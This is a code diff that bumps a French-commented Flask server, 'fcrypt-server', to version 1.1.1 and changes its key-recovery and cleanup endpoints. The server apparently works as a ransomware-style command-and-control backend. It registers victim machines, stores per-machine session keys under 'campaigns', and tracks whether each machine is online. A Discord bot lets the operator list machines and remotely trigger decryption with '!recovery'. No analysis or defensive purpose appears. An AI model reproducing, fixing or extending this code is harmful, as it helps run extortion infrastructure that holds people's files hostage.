@@ -1,4 +1,4 @@
-# serverv1.1.0.py
+# serverv1.1.1.py
 #!/usr/bin/env python3
 
 import os
@@ -41,7 +41,7 @@ if _REDIS_URL:
     try:
         import redis
         import ssl
-        
+
         if _REDIS_URL.startswith("rediss://"):
             _redis_client = redis.from_url(
                 _REDIS_URL,
@@ -58,7 +58,7 @@ if _REDIS_URL:
                 socket_connect_timeout=5,
                 ssl_cert_reqs=ssl.CERT_NONE
             )
-            
+
         _redis_client.ping()
         print("[state] Redis connecté — persistance OK")
     except Exception as e:
@@ -72,9 +72,7 @@ if _IS_RENDER and _redis_client is None and not os.environ.get("STATE_FILE_PERSI
     print("[WARNING] /tmp/ est éphémère → state PERDU à chaque restart.")
     print("[WARNING] Toutes les campagnes actives deviendront irrécupérables.")
     print("[WARNING] Fix : configure REDIS_URL ou monte un disque persistant.")
-    print("[WARNING] Pour confirmer que tu as lu : STATE_FILE_PERSISTENT=1")
     print("=" * 70)
-# ═════════════════════════════════════════════════════════
 
 if not MASTER_KEY_B64:
     raise RuntimeError("MASTER_KEY_B64 manquant")
@@ -283,7 +281,6 @@ def _arm_recovery_campaign(campaign_id: str) -> bool:
 
 
 def _take_campaign(campaign_id: str):
-    """Vérifie et consomme la récupération en attente. Retourne le session_key hex ou None."""
     with _state_lock:
         c = STATE.get("c:" + campaign_id)
         if c is None or c.get("status") != "active":
@@ -325,12 +322,12 @@ def _human_delta(sec) -> str:
 
 @app.route("/health", methods=["GET"])
 def health():
-    return jsonify({"status": "ok", "service": "fcrypt-server", "version": "1.1.0"}), 200
+    return jsonify({"status": "ok", "service": "fcrypt-server", "version": "1.1.1"}), 200
 
 
 @app.route("/", methods=["GET"])
 def root():
-    return jsonify({"status": "ok", "service": "fcrypt-server", "version": "1.1.0"}), 200
+    return jsonify({"status": "ok", "service": "fcrypt-server", "version": "1.1.1"}), 200
 
 
 @app.route("/state_info", methods=["GET"])
@@ -606,6 +603,9 @@ def unlock():
                     "nonce": nonce_hex}), 200
 
 
+# ═══════════════════════════════════════════════════════════════════
+#  CLEANER RECOVERY — FIX : renvoie TOUTES les campagnes
+# ═══════════════════════════════════════════════════════════════════
 @app.route("/cleaner_recovery", methods=["POST"])
 def cleaner_recovery():
     try:
@@ -644,7 +644,7 @@ def cleaner_recovery():
     if not campaigns:
         return jsonify({"status": "error", "reason": "no_campaigns_found"}), 404
 
-    # Trie par created_at décroissant (plus récente en premier)
+    # Trie par date décroissante
     campaigns.sort(key=lambda c: c.get("created_at") or 0, reverse=True)
 
     app.logger.info("cleaner_recovery mid=%s → %d campagne(s)",
@@ -653,12 +653,15 @@ def cleaner_recovery():
     return jsonify({
         "status": "ok",
         "campaigns": campaigns,
-        # Compat : ancien format (1re campagne)
+        # Compat : ancien format
         "campaign_id": campaigns[0]["campaign_id"],
         "session_key": campaigns[0]["session_key"],
     }), 200
 
 
+# ═══════════════════════════════════════════════════════════════════
+#  FORGET RECOVERED — FIX : ne supprime QUE la campagne concernée
+# ═══════════════════════════════════════════════════════════════════
 @app.route("/forget_recovered", methods=["POST"])
 def forget_recovered():
     try:
@@ -668,28 +671,32 @@ def forget_recovered():
 
     machine_id = str(req.get("machine_id", "")).strip().lower()
     auth_token = str(req.get("auth_token", "")).strip().lower()
+    campaign_id = str(req.get("campaign_id", "")).strip().lower()  # optionnel
 
     if not machine_id or not auth_token:
         return jsonify({"status": "error", "reason": "missing_fields"}), 400
 
     _refresh_state()
-    valid = False
     removed = 0
+    valid = False
     with _state_lock:
         for k, v in list(STATE.items()):
-            if k.startswith("c:") and isinstance(v, dict) and v.get("machine_id") == machine_id:
-                if hmac.compare_digest(v.get("auth_token", ""), auth_token):
-                    valid = True
-                    STATE.pop(k, None)
-                    removed += 1
+            if not k.startswith("c:") or not isinstance(v, dict):
+                continue
+            if v.get("machine_id") != machine_id:
+                continue
+            if campaign_id and k[2:] != campaign_id:
+                continue
+            if hmac.compare_digest(v.get("auth_token", ""), auth_token):
+                valid = True
+                STATE.pop(k, None)
+                removed += 1
         if not valid:
             return jsonify({"status": "error", "reason": "unauthorized"}), 403
-        STATE.pop("m:" + machine_id, None)
-        STATE.pop("h:" + machine_id, None)
-        STATE.pop("r:" + machine_id, None)
         _save_state(STATE)
 
-    app.logger.info("forget_recovered machine=%s removed=%d", machine_id[:8], removed)
+    app.logger.info("forget_recovered machine=%s removed=%d",
+                    machine_id[:8], removed)
     return jsonify({"status": "ok", "removed": removed}), 200
 
 
@@ -722,7 +729,7 @@ def _discord_bot_main(token: str):
         _BOT_STATE["error"] = f"discord.py indisponible ({e})"
         print(f"[bot] {_BOT_STATE['error']}")
         return
-        
+
     print(f"[bot] bot.run imminent — token={token[:8]}… admin_ids={DISCORD_ADMIN_IDS}")
     import asyncio
     try:
@@ -765,7 +772,7 @@ def _discord_bot_main(token: str):
             fields=[
                 ("!list", "Affiche les machines et leurs IDs complets.", False),
                 ("!recovery <machine_id>", "Déclenche le déchiffrement à distance.", False),
-            ], footer=f"fcrypt-server v1.1.0 · par {ctx.author}"))
+            ], footer=f"fcrypt-server v1.1.1 · par {ctx.author}"))
 
     @bot.command(name="list")
     async def _list_cmd(ctx):
@@ -789,9 +796,9 @@ def _discord_bot_main(token: str):
             online = bool(hs) and (now - hs) <= HEARTBEAT_TTL
             status = "✅ en ligne" if online else "❌ hors ligne"
             ago = "jamais vu" if not hs else f"vu il y a {_human_delta(now - hs)}"
-            
+
             lines = [f"**Machine ID** :\n`{mid}`", f"{status} · {ago}"]
-            
+
             if campaigns.get(mid):
                 lines.append("**Campagnes :**")
                 for cid, cv in campaigns.get(mid, []):
@@ -800,12 +807,12 @@ def _discord_bot_main(token: str):
                     lines.append(f"`{cid}` ({cs})")
             else:
                 lines.append("_Aucune campagne._")
-                
+
             fields.append((" ", "\n".join(lines), False))
-            
+
         await ctx.send(embed=_embed(f"Machines ({len(mids)})", COL_INFO,
             "Clique sur un ID pour le copier.", fields=fields,
-            footer=f"fcrypt-server v1.1.0 · par {ctx.author}"))
+            footer=f"fcrypt-server v1.1.1 · par {ctx.author}"))
 
     @bot.command(name="recovery")
     async def _recovery_cmd(ctx, mid: str = ""):
@@ -814,7 +821,7 @@ def _discord_bot_main(token: str):
         mid = mid.strip().lower()
         if not re.fullmatch(r"[0-9a-f]{8,64}", mid):
             await ctx.send(embed=_embed("Usage", COL_WARN, "`!recovery <machine_id>`")); return
-        
+
         armed = _arm_recovery(mid)
         if armed:
             await ctx.send(embed=_embed(f"Récupération armée — `{mid[:16]}…`", COL_OK,
